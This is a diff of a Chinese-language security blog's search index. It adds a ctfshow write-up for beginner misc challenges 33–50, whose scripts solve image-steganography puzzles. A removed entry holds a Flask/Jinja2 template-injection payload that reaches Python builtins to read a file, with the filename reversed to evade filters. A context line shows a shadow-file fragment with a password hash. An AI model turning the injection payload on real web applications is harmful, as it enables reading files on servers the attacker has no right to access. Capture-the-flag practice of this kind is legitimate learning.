print(hex(i),hex(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc33"><a href="#misc33" class="headerlink" title="misc33"></a>misc33</h1><p>同上，只是把高也改了，crc32还是正确的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4096</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4096</span>):</span><br><span class="line">        c = bytes.fromhex(<span class="string">'4948445200000384000000960802000000'</span>)</span><br><span class="line">        ihdr = c[:<span class="number">4</span>]+struct.pack(<span class="string">'&gt;i'</span>,i)+struct.pack(<span class="string">'&gt;i'</span>,j)+c[<span class="number">12</span>:]</span><br><span class="line">        crc = <span class="number">0x5255A798</span></span><br><span class="line">        <span class="keyword">if</span> zlib.crc32(ihdr) == crc:</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc34"><a href="#misc34" class="headerlink" title="misc34"></a>misc34</h1><p>IHDR块的CRC改成错误宽度的crc了，所以上面方法不适用，直接暴力爆破宽度，手动找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="comment">#爆破png宽度</span></span><br><span class="line">f = open(<span class="string">r'misc34.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">width = c[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">height = c[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">900</span>,<span class="number">1200</span>):</span><br><span class="line">    f1 = open(<span class="string">'./bpout/'</span>+str(i)+<span class="string">'.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line">    <span class="comment"># print(struct.pack('&gt;i',i)[::-1])</span></span><br><span class="line">    img = c[:<span class="number">20</span>]+struct.pack(<span class="string">'&gt;i'</span>,i)+c[<span class="number">24</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc35"><a href="#misc35" class="headerlink" title="misc35"></a>misc35</h1><p>这题先把高度改高一点，flag在先下面，然后去爆破jpg的宽度，原理都差不多</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="comment">#爆破jpg宽度</span></span><br><span class="line">f = open(<span class="string">'./misc35/misc35.jpg'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line"><span class="comment"># width = c[c.index(b'\x00\x96\x03\x84')+2:c.index(b'\x00\x96\x03\x84')+4]</span></span><br><span class="line"><span class="comment"># height = c[c.index(b'\x00\x96\x03\x84'):c.index(b'\x00\x96\x03\x84')+2]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">900</span>,<span class="number">1000</span>):</span><br><span class="line">    f1 = open(<span class="string">'./bpout/'</span>+str(i)+<span class="string">'.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">    <span class="comment"># print(struct.pack('&gt;i',i)[::-1])</span></span><br><span class="line">    img = c[:c.index(<span class="string">b'\x02\x96\x03\x84'</span>)+<span class="number">2</span>]+struct.pack(<span class="string">'&gt;h'</span>,i)+c[c.index(<span class="string">b'\x02\x96\x03\x84'</span>)+<span class="number">4</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc36"><a href="#misc36" class="headerlink" title="misc36"></a>misc36</h1><p>这题也先把gif的高度拉高，记得修改不止一处，然后再去爆破宽度，当然不用脚本也行，这题给了范围，手动试试就好</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="comment">#爆破gif宽度</span></span><br><span class="line">f = open(<span class="string">'./misc36/misc36.gif'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line"><span class="comment"># width = c[c.index(b'\x00\x96\x03\x84')+2:c.index(b'\x00\x96\x03\x84')+4]</span></span><br><span class="line"><span class="comment"># height = c[c.index(b'\x00\x96\x03\x84'):c.index(b'\x00\x96\x03\x84')+2]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">920</span>,<span class="number">950</span>):</span><br><span class="line">    f1 = open(<span class="string">'./bpout/'</span>+str(i)+<span class="string">'.gif'</span>,<span class="string">'wb'</span>)</span><br><span class="line">    <span class="comment"># print(struct.pack('&gt;i',i)[::-1])</span></span><br><span class="line">    img = c[:c.index(<span class="string">b'\x00\x00\x84\x03\x96\x02'</span>)+<span class="number">2</span>]+struct.pack(<span class="string">'&gt;h'</span>,i)[::<span class="number">-1</span>]+c[c.index(<span class="string">b'\x00\x00\x84\x03\x96\x02'</span>)+<span class="number">4</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc37"><a href="#misc37" class="headerlink" title="misc37"></a>misc37</h1><p>在9、14、21、31、34帧里，直接stegsolve看就行</p>
+<h1 id="misc38"><a href="#misc38" class="headerlink" title="misc38"></a>misc38</h1><p>是一张apng图片，即动态的png图片，用浏览器安装个插件就可以看到动态效果了（好像有些浏览器默认支持），这里推荐用<a href="http://www.downcc.com/soft/40902.html" target="_blank" rel="noopener">apngdisassembler</a>直接分离每一帧，找找就好了</p>
+<h1 id="misc39"><a href="#misc39" class="headerlink" title="misc39"></a>misc39</h1><p>gif帧数间隔隐写，kali里用命令<code>identify -format &quot;%T &quot; misc39.gif &gt; misc39.txt</code>提取帧数，转01再七位一组转字符即可（为啥是七位就要问套神了😶）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">'37 37 36 36 36 37 37 37 37 37 36 37 36 36 37 37 36 36 37 37 36 37 37 37 36 36 37 37 37 37 36 37 36 36 36 37 37 36 37 37 37 37 37 37 37 36 37 37 37 37 37 37 37 36 37 37 36 37 37 36 37 36 37 36 37 37 36 36 37 36 36 37 37 37 36 36 36 36 37 37 36 36 36 37 36 37 37 36 36 37 36 37 37 36 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 37 36 37 37 36 37 36 37 37 37 36 36 37 37 36 37 37 36 36 36 37 36 36 37 37 36 37 37 37 37 37 36 36 36 37 36 37 37 36 36 37 36 37 36 37 37 36 36 37 36 36 37 37 36 37 37 36 36 37 37 37 36 36 36 37 37 36 36 37 36 36 36 37 37 37 36 36 37 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 37 36 36 36 36 37 36 37 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 36 37 36 37 37 36 36 36 37 37 37 37 36 36 36 36 37 36 37 37 36 36 36 36 36 37 37 36 37 36 36 36 37 37 36 37 36 37 36 37 37 37 36 36 37 37 37 37 37 37 36 37'</span></span><br><span class="line">s = s.replace(<span class="string">'37'</span>,<span class="string">'1'</span>).replace(<span class="string">'36'</span>,<span class="string">'0'</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment"># s = s[1:]</span></span><br><span class="line">print(s)</span><br><span class="line">print(len(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(chr(int(s[i*<span class="number">7</span>:i*<span class="number">7</span>+<span class="number">7</span>],<span class="number">2</span>)),end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h1><p>原理跟上题差不多，只不过换成了apng的帧时间间隔隐写，用<a href="http://www.downcc.com/soft/40902.html" target="_blank" rel="noopener">apngdisassembler</a>分解的时候会带一个时间间隔的txt，所以脚本很好写，还有前面多了些干扰数据，所以从28个开始</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#apng时间隐写</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>,<span class="number">69</span>):</span><br><span class="line">    f = open(<span class="string">'./misc40/apngframe'</span>+str(i)+<span class="string">'.txt'</span>)</span><br><span class="line">    c =f.read()</span><br><span class="line">    print(chr(int(c.split(<span class="string">'/'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>])),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc41"><a href="#misc41" class="headerlink" title="misc41"></a>misc41</h1><p>愚人节专属题目，在010里面直接搜F001看高亮部分即可（不要问为什么，问就是八神师傅脑洞太大了）(直接偷个mumuzi的图)</p>
+<p><img src="https://img-blog.csdnimg.cn/20210401210216786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODgwNzE5,size_16,color_FFFFFF,t_70" alt="misc41"></p>
+<h1 id="misc42"><a href="#misc42" class="headerlink" title="misc42"></a>misc42</h1><p>IDAT块长度隐写，拖到tweakpng就很容易看出来，当然前面也多了些干扰数据，从99，116开始</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">123</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">100</span>,<span class="number">48</span>,<span class="number">102</span>,<span class="number">57</span>,<span class="number">99</span>,<span class="number">56</span>,<span class="number">100</span>,<span class="number">51</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">101</span>,<span class="number">55</span>,<span class="number">48</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">57</span>,<span class="number">102</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">99</span>,<span class="number">54</span>,<span class="number">53</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc43"><a href="#misc43" class="headerlink" title="misc43"></a>misc43</h1><p>CRC32隐写，一拖入tweakpng就一堆报错，每块IDAT的CRC32都是错的，使用pngdebugger提取错误的crc，再转hex转字符就好了</p>
+<p><img src="/2021/04/04/ctfshow-misc%E5%85%A5%E9%97%A8-31-50/misc43.png" alt="misc43"></p>
+<p><img src="/2021/04/04/ctfshow-misc%E5%85%A5%E9%97%A8-31-50/misc43-1.png" alt="misc43-1"></p>
+<h1 id="misc44"><a href="#misc44" class="headerlink" title="misc44"></a>misc44</h1><p>也是一种CRC32隐写，错误的CRC32和正确的CRC32分别代表着01，再8位一组转字符，劝大家不要拖进tweakpng，因为会有几百个弹窗。。。</p>
+<p>至于如何提取正确和错误的CRC32，我的做法是用<a href="https://www.anquanke.com/post/id/86793" target="_blank" rel="noopener">PCRT</a>识别再放入txt，再写个脚本，就比较容易</p>
+<p>PCRT命令如下</p>
+<p><code>python PCRT.py -y -v -i misc44.png &gt; 123.txt</code></p>
+<p>python脚本如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">'123.txt'</span>)</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    c = f.readline()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'chunk crc'</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(c)</span></span><br><span class="line">            res+=<span class="string">'0'</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'Correct IDAT CRC'</span> <span class="keyword">in</span> c:</span><br><span class="line">            res+=<span class="string">'1'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line">print(len(res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)//<span class="number">8</span>):</span><br><span class="line">    a = res[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(chr(int(a,<span class="number">2</span>)),end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="misc45"><a href="#misc45" class="headerlink" title="misc45"></a>misc45</h1><p>不会，菜鸡完全看不出来😭</p>
+<h1 id="misc46"><a href="#misc46" class="headerlink" title="misc46"></a>misc46</h1><p>比较有意思的一个题，用gif每一帧的偏移量作为坐标来画图即可，这里gif的偏移量我是用identify命令直接获取的</p>
+<p><code>identify misc46.gif &gt; 233.txt</code></p>
+<p>再写个脚本画图即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">f = open(<span class="string">'233.txt'</span>)</span><br><span class="line">pp = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    c = f.readline()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        s = eval(c.split(<span class="string">'+'</span>)[<span class="number">1</span>]+<span class="string">','</span>+c.split(<span class="string">'+'</span>)[<span class="number">2</span>][:<span class="number">2</span>])</span><br><span class="line">        pp.append(s)</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="comment"># print(c)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">'RGB'</span>,(<span class="number">400</span>,<span class="number">70</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    new = Image.new(<span class="string">'RGB'</span>,(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img.paste(new,i)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc47"><a href="#misc47" class="headerlink" title="misc47"></a>misc47</h1><p>跟上一题差不多，只不过图片格式变成了apng，apng每一帧的偏移提取稍微有点麻烦，我是自己在hex定位后写脚本提取的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">f = open(<span class="string">'misc47.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = c[c.index(bytes.fromhex(<span class="string">'6663544C00000001'</span>)):]</span><br><span class="line">pp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1124</span>,<span class="number">2</span>):</span><br><span class="line">    start = c.index(bytes.fromhex(<span class="string">'6663544C0000'</span>)+struct.pack(<span class="string">'&gt;h'</span>,i))</span><br><span class="line">    <span class="comment"># start = c.index(bytes.fromhex('6663544C000000'+hex(i)[2:]))</span></span><br><span class="line">    <span class="comment"># print(start)</span></span><br><span class="line">    fc = c[start:start+<span class="number">30</span>]</span><br><span class="line">    print(fc[<span class="number">18</span>:<span class="number">20</span>],fc[<span class="number">22</span>:<span class="number">24</span>])</span><br><span class="line">    print(struct.unpack(<span class="string">'&gt;h'</span>,fc[<span class="number">18</span>:<span class="number">20</span>])+struct.unpack(<span class="string">'&gt;h'</span>,fc[<span class="number">22</span>:<span class="number">24</span>]))</span><br><span class="line">    pp.append(struct.unpack(<span class="string">'&gt;h'</span>,fc[<span class="number">18</span>:<span class="number">20</span>])+struct.unpack(<span class="string">'&gt;h'</span>,fc[<span class="number">22</span>:<span class="number">24</span>]))</span><br><span class="line">    <span class="comment"># print(fc.index(b'\xb6'),fc.index(b'\x34'))</span></span><br><span class="line"><span class="comment"># print(c[:100])</span></span><br><span class="line">img = Image.new(<span class="string">'RGB'</span>,(<span class="number">400</span>,<span class="number">70</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    new = Image.new(<span class="string">'RGB'</span>,(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img.paste(new,i)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc48"><a href="#misc48" class="headerlink" title="misc48"></a>misc48</h1><p>脑洞题，问八神师傅才知道的</p>
+<p>根据DQT块的提示，叫我们统计FF的数量再减1，一开始我以为是统计所有的，完全没找到思路，后来八神师傅说是统计每两个有意义块之间的FF的数量再减一，因为每两个有意义块之间插入数据好像是不太影响的，至于要减一是因为这段中的最后一个FF是下一个有意义块的开头，取前32个段即可，会发现每个段长度都不超过16，所以直接转为16进制就是flag</p>
+<p><img src="/2021/04/04/ctfshow-misc%E5%85%A5%E9%97%A8-31-50/misc48.png" alt="misc48"></p>
+<p>就是上图种紫色的FF段，取前32段的长度减一转16进制即可（不要忘记第一个），最后统计出来长度如下</p>
+<p><code>0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">'0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10'</span></span><br><span class="line">d = <span class="string">'0123456789abcdef'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">' '</span>):</span><br><span class="line">    print(d[int(i)],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc49"><a href="#misc49" class="headerlink" title="misc49"></a>misc49</h1><p>脑洞题，也是问八神师傅才知道的</p>
+<p>拖到010会发现开头有好多FFE?的块，后面还跟着一些奇怪的设备名，一开始我统计了下FFE0-FFEF块的数量，发现刚好32个，然后就没思路了，后来问了下八神师傅，原来E后面的那位就是flag，最后按照这些块的顺序把E后面那位合起来就行了，最后如下</p>
+<p><code>0c618671a153f5da3948fdb2a2238e44</code></p>
+<p><img src="/2021/04/04/ctfshow-misc%E5%85%A5%E9%97%A8-31-50/misc49.png" alt="misc49"></p>
+<h1 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h1><p>直接stegsolve看就有了</p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+        <tag>misc入门</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>phar反序列化的一些理解</title>
     <url>/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h3 id="1-为什么要利用phar"><a href="#1-为什么要利用phar" class="headerlink" title="1.为什么要利用phar"></a>1.为什么要利用phar</h3><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/1.png" alt="1"></p>
@@ -788,25 +883,6 @@
       <tags>
         <tag>php代码审计</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>flask学习</title>
-    <url>/2020/08/14/flask%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>就主要就记录下flask模板注入的一些payload</p>
-<p>切片法，省去了一个个找的步骤</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">`&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; `</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>学习记录</category>
-      </categories>
-      <tags>
-        <tag>flask</tag>
       </tags>
   </entry>
   <entry>
@@ -954,6 +1030,15 @@ b&#39;::\\nmongodb:!:17843:0:99999:7:::\\nubuntu:$6$LhHRomTE$M7C4n84UcFLAG{xx2b8
       </tags>
   </entry>
   <entry>
+    <title>我的第一篇博客</title>
+    <url>/2020/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h1 id="欢迎来到我的博客！"><a href="#欢迎来到我的博客！" class="headerlink" title="欢迎来到我的博客！"></a>欢迎来到我的博客！</h1><p>一起来学习吧</p>
+]]></content>
+      <categories>
+        <category>起航</category>
+      </categories>
+  </entry>
+  <entry>
     <title>关于pop链的学习</title>
     <url>/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a href="https://www.bilibili.com/video/BV1oE411j7aF" target="_blank" rel="noopener">2020-3-1-prontosil-反序列化与POP链</a></p>
@@ -1039,13 +1124,13 @@ b&#39;::\\nmongodb:!:17843:0:99999:7:::\\nubuntu:$6$LhHRomTE$M7C4n84UcFLAG{xx2b8
       </tags>
   </entry>
   <entry>
-    <title>我的第一篇博客</title>
-    <url>/2020/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h1 id="欢迎来到我的博客！"><a href="#欢迎来到我的博客！" class="headerlink" title="欢迎来到我的博客！"></a>欢迎来到我的博客！</h1><p>一起来学习吧</p>
+    <title>新的开始</title>
+    <url>/2021/02/01/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
+    <content><![CDATA[<p>渐渐的又懒成了这个样子，这样下去永远都翻不了身，越来越讨厌现在的自己了，今天看看能不能当成新的开始吧。。。</p>
 ]]></content>
-      <categories>
-        <category>起航</category>
-      </categories>
+      <tags>
+        <tag>瞎写</tag>
+      </tags>
   </entry>
   <entry>
     <title>攻防世界Web_php_unserialize</title>
@@ -1073,15 +1158,6 @@ b&#39;::\\nmongodb:!:17843:0:99999:7:::\\nubuntu:$6$LhHRomTE$M7C4n84UcFLAG{xx2b8
       <tags>
         <tag>php</tag>
         <tag>unserialize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新的开始</title>
-    <url>/2021/02/01/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
-    <content><![CDATA[<p>渐渐的又懒成了这个样子，这样下去永远都翻不了身，越来越讨厌现在的自己了，今天看看能不能当成新的开始吧。。。</p>
-]]></content>
-      <tags>
-        <tag>瞎写</tag>
       </tags>
   </entry>
   <entry>
